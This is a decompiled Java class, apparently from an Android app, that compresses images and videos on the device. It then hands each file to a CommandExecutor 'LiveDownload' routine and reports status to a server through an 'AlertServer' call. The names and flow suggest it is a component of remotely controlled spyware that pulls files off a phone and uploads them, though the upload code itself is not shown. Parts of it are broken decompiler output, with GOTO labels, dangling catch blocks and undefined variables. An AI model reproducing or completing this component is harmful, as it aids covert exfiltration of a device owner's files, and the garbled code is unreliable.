/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.Context
 *  android.graphics.Bitmap
 *  android.graphics.Bitmap$CompressFormat
 *  android.graphics.BitmapFactory
 *  android.graphics.BitmapFactory$Options
 *  android.net.Uri
 */
package linker.resourcer.encoder;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import linker.resourcer.encoder.MyCompressor$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.MyCompressor$$ExternalSyntheticLambda1;
import linker.resourcer.encoder.CommandExecutor;
import linker.resourcer.encoder.WorkerService;

public class MyCompressor {
    /*
     * Unable to fully structure code
     */
    public static void compressImageFile(Context var0, String var1_1, String var2_7, int var3_8, String var4_9) {
        block10: {
            block11: {
                var8_10 = new BitmapFactory.Options();
                var8_10.inJustDecodeBounds = true;
                BitmapFactory.decodeFile((String)var1_1, (BitmapFactory.Options)var8_10);
                var6_11 = var8_10.outWidth;
                var7_12 = var8_10.outHeight;
                var5_13 = Math.min(var6_11, 720);
                var6_11 = (int)((float)var7_12 * (float)var5_13 / (float)var6_11);
                var8_10.inJustDecodeBounds = false;
                var8_10 = BitmapFactory.decodeFile((String)var1_1, (BitmapFactory.Options)var8_10);
                if (var8_10 != null) ** GOTO lbl17
                WorkerService.MyWorker.AlertServer(var0, "Fast Download", "Error: Create image");
                return;
lbl17:
                // 1 sources

                var9_14 = Bitmap.createScaledBitmap((Bitmap)var8_10, (int)var5_13, (int)var6_11, (boolean)true);
                try {
                    var10_15 = new FileOutputStream(var2_7);
                    var11_16 = Bitmap.CompressFormat.JPEG;
                }
                catch (Exception var1_4) {}
                try {
                    var9_14.compress(var11_16, var3_8, (OutputStream)var10_15);
                    var10_15.flush();
                    var10_15.close();
                    var8_10.recycle();
                    var9_14.recycle();
                    var2_7 = Uri.parse((String)var2_7.trim());
                    var8_10 = new File(var2_7.getPath());
                    if (!var8_10.exists()) ** GOTO lbl38
                }
                catch (Exception var1_3) {}
                try {
                    var8_10 = new MyCompressor$$ExternalSyntheticLambda0(var0, (Uri)var2_7, var4_9, var1_1);
                    var9_14 = new Thread((Runnable)var8_10);
                    var9_14.start();
                    break block10;
lbl38:
                    // 1 sources

                    WorkerService.MyWorker.AlertServer(var0, "Fast Download", "File not found");
                }
                catch (Exception var1_2) {
                    break block11;
                }
                break block11;
                catch (Exception var1_5) {
                    // empty catch block
                }
            }
            WorkerService.MyWorker.AlertServer(var0, "Fast Download", "Error:" + var1_6.getMessage());
        }
    }

    public static void compressVideo(Context context, String string2, String string3, String string4) {
        try {
            string3 = Uri.parse((String)string2.trim());
            Object object = new File(string3.getPath());
            if (((File)object).exists()) {
                WorkerService.MyWorker.AlertServer(context, "Fast Download", "Sending video without compression...");
                MyCompressor$$ExternalSyntheticLambda1 myCompressor$$ExternalSyntheticLambda1 = new MyCompressor$$ExternalSyntheticLambda1(context, (Uri)string3, string4, string2);
                object = new Thread(myCompressor$$ExternalSyntheticLambda1);
                ((Thread)object).start();
            } else {
                WorkerService.MyWorker.AlertServer(context, "Fast Download", "File not found");
            }
        }
        catch (Exception exception) {
            exception.printStackTrace();
            WorkerService.MyWorker.AlertServer(context, "Fast Download", exception.getMessage());
        }
    }

    static /* synthetic */ void lambda$compressImageFile$1(Context context, Uri uri, String string2, String string3) {
        CommandExecutor.instance(context).LiveDownload(context, uri.getPath(), string2, string3, true);
    }

    static /* synthetic */ void lambda$compressVideo$0(Context context, Uri uri, String string2, String string3) {
        CommandExecutor.instance(context).LiveDownload(context, uri.getPath(), string2, string3, false);
    }
}

